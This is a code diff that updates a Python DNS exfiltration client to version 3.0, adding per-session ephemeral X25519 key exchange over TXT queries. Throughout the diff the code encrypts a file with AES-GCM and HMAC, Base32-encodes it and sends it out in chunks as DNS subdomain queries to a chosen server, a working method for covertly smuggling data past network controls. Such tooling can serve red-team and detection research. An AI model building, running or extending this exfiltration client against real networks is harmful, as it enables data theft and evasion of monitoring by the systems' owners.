@@ -3,16 +3,19 @@
 Module Name: client.py
 
 Description:
-    DNS exfiltration client using X25519 key exchange, AES-GCM encryption,
-    Base32 encoding, and HMAC for integrity.
+    DNS exfiltration client with per-session ephemeral key exchange,
+    AES-GCM encryption, Base32 encoding, and HMAC integrity.
 
-    - Derives a per-transfer AES key and HMAC key via ECDH (X25519 + HKDF).
-    - Encrypts file with AES-GCM, appends HMAC tag, then Base32-encodes.
-    - Splits Base32 string into DNS-safe chunks and sends as subdomains.
+    - Generates an ephemeral X25519 keypair per transfer.
+    - Sends client pubkey via TXT query, receives server ephemeral pubkey
+      in TXT response (true PFS — no persistent keys on either side).
+    - Derives per-transfer AES and HMAC keys via ECDH + HKDF.
+    - Encrypts file with AES-GCM, appends HMAC tag, Base32-encodes.
+    - Splits into DNS-safe chunks and sends as A-query subdomains.
 
 Author: John Burns
 Date: 2025-05-02
-Version: 2.2 (Refactored for clarity)
+Version: 3.0 (Per-session ephemeral keys)
 """
 
 import argparse
@@ -33,10 +36,8 @@ from cryptography.hazmat.primitives.asymmetric import x25519
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from dnslib import DNSRecord, DNSQuestion, QTYPE
-from dotenv import load_dotenv, find_dotenv
 
 # Setup
-load_dotenv(find_dotenv())
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger('client')
 
@@ -44,11 +45,12 @@ logger = logging.getLogger('client')
 MAX_RETRIES = 3
 
 
-def derive_shared_keys(client_priv, server_pub):
+def derive_shared_keys(client_priv, server_pub_bytes):
     """
     Perform ECDH and derive AES-GCM key and HMAC key.
     Returns (aes_key, hmac_key).
     """
+    server_pub = x25519.X25519PublicKey.from_public_bytes(server_pub_bytes)
     shared = client_priv.exchange(server_pub)
     material = HKDF(algorithm=hashes.SHA256(), length=48, salt=None, info=b'dns-exfil').derive(shared)
     return material[:32], material[32:]
@@ -87,7 +89,7 @@ def chunk_payload(b32_string, identifier, *, min_size=16, max_label_len=52):
     """
 
     # Estimate total segments if we used min_size chunks,
-    # so we know how many digits “total” will consume.
+    # so we know how many digits "total" will consume.
     est_segments = max(1, math.ceil(len(b32_string) / min_size))
     tot_digits = len(str(est_segments))
 
@@ -95,7 +97,7 @@ def chunk_payload(b32_string, identifier, *, min_size=16, max_label_len=52):
     pos = 0
     idx = 0
 
-    # First pass: carve out all the data‐chunks
+    # First pass: carve out all the data-chunks
     while pos < len(b32_string):
         idx_digits = len(str(idx))
         # overhead = len(id) + digits(idx) + digits(total) + 3 hyphens
@@ -114,7 +116,6 @@ def chunk_payload(b32_string, identifier, *, min_size=16, max_label_len=52):
     # Second pass: yield the properly formatted labels
     for idx, seg in enumerate(segments):
         yield f"{identifier}-{idx}-{total}-{seg}"
-
 
 
 def send_query(subdomain, args):
@@ -152,37 +153,55 @@ def reliable_send(subdomain, args):
 
 def perform_key_exchange(identifier, args):
     """
-    Generate ephemeral keypair, send public in chunks, derive shared keys.
+    Generate ephemeral client keypair, send pubkey as TXT query,
+    receive server's ephemeral pubkey from TXT response, derive shared keys.
     Returns (aes_key, hmac_key).
     """
-    server_pub = x25519.X25519PublicKey.from_public_bytes(args.server_pubkey)
     client_priv = x25519.X25519PrivateKey.generate()
-    pub_bytes = client_priv.public_key().public_bytes(encoding=serialization.Encoding.Raw,
-                                                      format=serialization.PublicFormat.Raw)
+    pub_bytes = client_priv.public_key().public_bytes(
+        encoding=serialization.Encoding.Raw,
+        format=serialization.PublicFormat.Raw
+    )
     b32_pub = base32_encode(pub_bytes)
-    # split into 50-char fragments
-    parts = [b32_pub[i:i + 50] for i in range(0, len(b32_pub), 50)]
-    for frag in parts:
-        sub = f"{identifier}-0-0-{frag}"
-        reliable_send(sub, args)
-    return derive_shared_keys(client_priv, server_pub)
 
+    # Split pubkey across DNS labels to stay within 63-char label limit.
+    # First label: <id>-0-0-<part1>, remaining parts as additional labels.
+    header = f"{identifier}-0-0-"
+    max_first = 63 - len(header)
+    labels = [header + b32_pub[:max_first]]
+    rest = b32_pub[max_first:]
+    while rest:
+        labels.append(rest[:63])
+        rest = rest[63:]
+    subdomain = '.'.join(labels)
+    fqdn = f"{subdomain}.{args.domain}"
 
-def fetch_server_pubkey(domain, server_ip, server_port):
-    """
-    Fetch the server's X25519 public key via DNS TXT query to public.<domain>.
-    Returns raw 32-byte public key.
-    """
-    q = DNSRecord.question(f"public.{domain}", 'TXT')
-    a = q.send(dest=server_ip, port=server_port, timeout=2)
-    resp = DNSRecord.parse(a)
-    for rr in resp.rr:
-        if rr.rtype == QTYPE.TXT:
-            txt = str(rr.rdata).strip('"')
-            pad_len = (8 - len(txt) % 8) % 8
-            txt = txt + "=" * pad_len
-            return base64.b32decode(txt)
-    raise ValueError("No TXT record found in response from server")
+    for attempt in range(1, MAX_RETRIES + 1):
+        q = DNSRecord(q=DNSQuestion(fqdn, QTYPE.TXT))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(3)
+        try:
+            sock.sendto(q.pack(), (args.server_ip, args.server_port))
+            resp_data, _ = sock.recvfrom(512)
+            resp = DNSRecord.parse(resp_data)
+
+            # Parse server's ephemeral pubkey from TXT response
+            for rr in resp.rr:
+                if rr.rtype == QTYPE.TXT:
+                    txt = str(rr.rdata).strip('"')
+                    pad_len = (8 - len(txt) % 8) % 8
+                    txt_padded = txt + '=' * pad_len
+                    server_pub_bytes = base64.b32decode(txt_padded)
+                    logger.info(f"Received server ephemeral pubkey for session {identifier}")
+                    return derive_shared_keys(client_priv, server_pub_bytes)
+
+            logger.warning(f"No TXT record in response, attempt {attempt}")
+        except Exception as e:
+            logger.warning(f"Key exchange query failed (attempt {attempt}): {e}")
+        finally:
+            sock.close()
+
+    raise RuntimeError("Key exchange failed after all retries")
 
 
 def main(args):
@@ -210,7 +229,7 @@ def main(args):
 
 
 def parse_args():
-    p = argparse.ArgumentParser(description="DNS Exfiltration Client (ECDH + AES-GCM + HMAC)")
+    p = argparse.ArgumentParser(description="DNS Exfiltration Client (Ephemeral ECDH + AES-GCM + HMAC)")
     p.add_argument('--server-ip', default='127.0.0.1')
     p.add_argument('--server-port', type=int, default=5300)
     p.add_argument('--file-path', required=True)
@@ -225,5 +244,4 @@ def parse_args():
 
 if __name__ == '__main__':
     args = parse_args()
-    args.server_pubkey = fetch_server_pubkey(args.domain, args.server_ip, args.server_port)
     main(args)
